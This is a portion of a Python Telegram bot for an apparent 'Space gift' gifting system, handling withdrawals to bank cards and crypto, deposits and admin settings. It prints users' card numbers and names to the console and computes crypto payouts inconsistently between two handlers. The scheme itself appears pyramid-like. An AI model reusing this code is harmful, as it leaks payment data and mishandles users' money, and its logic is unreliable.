        if not message.text.isdigit():
            await message.answer("Введите пожалуйста сумму в виде цифр!")
            return

        if int(message.text) < 1000:
            await message.answer("Слишком маленькая сумма")
            return

        async with state.proxy() as data:
            if data.get('IS_INVEST') is True:
                money = int(await db.get_gift_money_invest(message.from_user.id, loop))
            else:
                money = int(await db.get_gift_money(message.from_user.id, loop))

        if int(message.text) > money:
            await message.answer(f"Недостаточно денег на счету. Доступно: {money} руб")
            return

        async with state.proxy() as data:
            data["WITHDRAW_AMOUNT"] = int(message.text)

        await message.answer(
            "📤 Выберите платежную систему, c помощью которой хотите вывести средства из бота",
            reply_markup=inline_keybords.get_inline_for_withdraw()
        )
        await WithdrawMoneyFSM.next()


@dp.message_handler(lambda mes: mes.text.lower() == "отменить", state="*")
async def cancel_handler(message: types.Message, state: FSMContext):
    await state.reset_state()
    await message.answer("Запрос на снятие денег отменен", reply_markup=inline_keybords.profile_markup())


@dp.callback_query_handler(text="withdraw_payrement_bank", state=WithdrawMoneyFSM.WITHDRAW_TYPE)
async def withdraw_payrement_bank(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["WITHDRAW_TYPE"] = "bank"
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass

    await bot.send_message(callback.from_user.id, "Введите номер карты, на которую хотите перевести деньги")
    await WithdrawMoneyFSM.NUMBER_CARD.set()


@dp.callback_query_handler(text="withdraw_payrement_crypt", state=WithdrawMoneyFSM.WITHDRAW_TYPE)
async def withdraw_payrement_crypt(callback: types.CallbackQuery, state: FSMContext):
    async with state.proxy() as data:
        data["WITHDRAW_TYPE"] = "crypt"
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    await bot.send_message(callback.from_user.id,
                           "🏦 Введите криптовалюту, на которую будет осуществляться вывод (BTC, USDT, ETH, LTC)")
    await WithdrawMoneyFSM.TYPE_CRYPT.set()


@dp.message_handler(state=WithdrawMoneyFSM.TYPE_CRYPT)
async def withdraw_payrement_crypt(message: types.Message, state: FSMContext):
    if message.text not in ['BTC', 'USDT', 'ETH', 'LTC', 'btc', 'usdt', 'eth', 'ltc']:
        await message.answer("Введите правильную криптовалюту")
        return
    async with state.proxy() as data:
        data["TYPE_CRYPT"] = message.text
    await message.answer(f"Введите адрес {message.text.upper()}, на который будет осуществляться вывод")
    await WithdrawMoneyFSM.CRYPT_CARD.set()


@dp.message_handler(state=WithdrawMoneyFSM.CRYPT_CARD)
async def withdraw_payrement_crypt(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data["CRYPT_CARD"] = message.text

    async with lock:
        if message.text == "Отменить":
            await state.reset_state()
            await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
            return

        async with state.proxy() as data:
            data["DATA_USER"] = 'crypt'
            commission = config.COMMISSION
            if data.get("WITHDRAW_COMMISSION"):
                commission = data.get("WITHDRAW_COMMISSION")

        data_requests = await state.get_data()
        print(data_requests)
        amount_com = int(data.get("WITHDRAW_AMOUNT")) - int(data.get("WITHDRAW_AMOUNT")) * commission
        utc_now = pytz.utc.localize(datetime.datetime.utcnow())
        date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

        if data.get("WITHDRAW_TYPE") == 'crypt':
            amount_crypt = int(data.get("WITHDRAW_AMOUNT"))
            curs = float(await coinbase_data.get_kurs(str(data.get("TYPE_CRYPT")).upper()))
            res = round(amount_com / curs, 11)
            await dbWithDraw.create_request_crypt(
                data_requests["CRYPT_CARD"],
                data_requests["DATA_USER"],
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                res,
                amount_com,
                message.from_user.id,
                date_time_now,
                data.get("TYPE_CRYPT"),
                loop
            )
        else:
            await dbWithDraw.create_request_bank(
                data_requests["NUMBER_CARD"],
                data_requests["DATA_USER"],
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                amount_com,
                message.from_user.id,
                date_time_now,
                loop
            )
        await message.answer(
            "Заявка на вывод средств успешно отправлена, ожидайте подтверждение "
            "отправки средств администратором в течении 24 часов вам придут деньги на "
            "ваши реквизиты",
            reply_markup=inline_keybords.profile_markup()
        )

        async with state.proxy() as data:
            if data.get('IS_INVEST') is True:
                await db.remove_gift_money_invest(message.from_user.id, data_requests["WITHDRAW_AMOUNT"], loop)
            else:
                await db.remove_gift_money(message.from_user.id, data_requests["WITHDRAW_AMOUNT"], loop)

        await state.reset_state()


@dp.message_handler(state=WithdrawMoneyFSM.NUMBER_CARD)
async def number_card(message: types.Message, state: FSMContext):
    if message.text == "Отменить":
        await state.reset_state()
        await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
        return

    async with state.proxy() as data:
        data["NUMBER_CARD"] = message.text

    await message.answer("Отлично. Теперь введите Ф.И.О")
    await WithdrawMoneyFSM.DATA_USER.set()


@dp.message_handler(state=WithdrawMoneyFSM.DATA_USER)
async def number_card(message: types.Message, state: FSMContext):
    async with lock:
        if message.text == "Отменить":
            await state.reset_state()
            await message.answer("Вывод денег успешно отменен", reply_markup=inline_keybords.profile_markup())
            return
        async with state.proxy() as data:
            data["DATA_USER"] = message.text
            commission = config.COMMISSION
            if data.get("WITHDRAW_COMMISSION"):
                commission = data.get("WITHDRAW_COMMISSION")

        data_requests = await state.get_data()
        print(data_requests)
        amount_com = int(data.get("WITHDRAW_AMOUNT")) - int(data.get("WITHDRAW_AMOUNT")) * commission
        utc_now = pytz.utc.localize(datetime.datetime.utcnow())
        date_time_now = utc_now.astimezone(pytz.timezone("UTC"))

        if data.get("WITHDRAW_TYPE") == 'crypt':
            amount_crypt = int(data.get("WITHDRAW_AMOUNT"))
            curs = float(await coinbase_data.get_kurs(str(data.get("TYPE_CRYPT")).upper()))
            res = round(amount_crypt / curs, 11)
            await dbWithDraw.create_request_crypt(
                data_requests["CRYPT_CARD"],
                data_requests["DATA_USER"],
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                res,
                amount_com,
                message.from_user.id,
                date_time_now,
                data.get("TYPE_CRYPT"),
                loop
            )
        else:
            await dbWithDraw.create_request_bank(
                data_requests["NUMBER_CARD"],
                data_requests["DATA_USER"],
                data_requests["WITHDRAW_TYPE"],
                data_requests["WITHDRAW_AMOUNT"],
                amount_com,
                message.from_user.id,
                date_time_now,
                loop
            )
        await message.answer(
            "Заявка на вывод средств успешно отправлена, ожидайте подтверждение "
            "отправки средств администраторомв течении 24 часов вам придут деньги на "
            "ваши реквизиты",
            reply_markup=inline_keybords.profile_markup()
        )

        async with state.proxy() as data:
            if data.get('IS_INVEST') is True:
                await db.remove_gift_money_invest(message.from_user.id, data_requests["WITHDRAW_AMOUNT"], loop)
            else:
                await db.remove_gift_money(message.from_user.id, data_requests["WITHDRAW_AMOUNT"], loop)

        await state.reset_state()


# ------------------------------------------------ RESET_SYSTEM_MESSAGE -----------------------------------------------

@dp.callback_query_handler(text="reset_system_yes")
async def reset_system_yes(callback: types.CallbackQuery, state):
    user_advance = await dbSystem.get_user_advance_payment(callback.from_user.id, loop)
    if user_advance is None:
        await pay_advance(callback, state)
    else:
        await callback.message.edit_text(
            text='Супер! Первого числа у вас будет возможность воспользоваться '
                 'ссылкой на 5 минут раньше от новых участников и получить подарки на свой депозит!\n\n'
                 'Не упустите возможность зайти в систему дарения Space gift один из первых',
            reply_markup=None,
        )


TRANSFER_DEP_USERS = []

@dp.callback_query_handler(text="reset_system_no")
async def reset_system_no(callback: types.CallbackQuery):
    if callback.from_user.id in TRANSFER_DEP_USERS:
        return

    TRANSFER_DEP_USERS.append(callback.from_user.id)
    user_data = (await db.get_full_data(callback.from_user.id, loop))[0]
    print(user_data)
    is_joined_SG = (int(user_data[11]) != 0 or int(user_data[14]) != 0)
    if is_joined_SG:
        amount_gift_money = int(user_data[18])
        if amount_gift_money >= 5000:
            await db.remove_amount_gift_money(callback.from_user.id, 5000, loop)
        elif int(user_data[29]) >= 5000:
            await db.remove_archive_dep(callback.from_user.id, 5000, loop)

        await db.add_depozit(callback.from_user.id, 5000, loop)
        await callback.message.edit_text(
            text='Отлично, Вы перенесли депозит',
            reply_markup=None,
        )


    else:
        try:
            await callback.message.delete()
        except:
            pass

# ------------------------------------------------Admin------------------------------------------------------------------------------


@dp.message_handler(commands="type")
async def change_type(message: types.Message):
    print(message.from_user.id)
    print(config.ADMINS[0])
    print(message.from_user.id in config.ADMINS)
    if message.from_user.id in config.ADMINS:
        await message.answer("Выберите криптовалюту", reply_markup=inline_keybords.get_admi_crypt_type())
        await ChangeCryptTypeFSN.TYPE.set()


@dp.message_handler(state=ChangeCryptTypeFSN.TYPE)
async def change_type_res(message: types.Message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        config.TYPE_CRIPT = message.text

        await message.answer(
            "Криптовалюта успешно установлена",
            reply_markup=inline_keybords.profile_markup()
        )

        await state.reset_state(with_data=False)


@dp.message_handler(content_types=["document", "video", "audio"])
def handle_files(message: types.Message):
    print(message.text + " " + str(message.from_user.id))


@dp.callback_query_handler(text="add_money_advance")
async def pay_advance(callback: types.CallbackQuery, state):
    try:
        await bot.delete_message(callback.from_user.id, callback.message.message_id)
    except:
        pass
    async with state.proxy() as data:
        data['pay_in_advance'] = True
    await bot.send_message(
        callback.from_user.id,
        "📤 Выберите платежную систему на которую хотите совершить перевод для пополнение средств в бота \n"
        "▪ Моментальные зачисление, а также автоматическая конверсия.",
        reply_markup=inline_keybords.get_gift()
    )


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
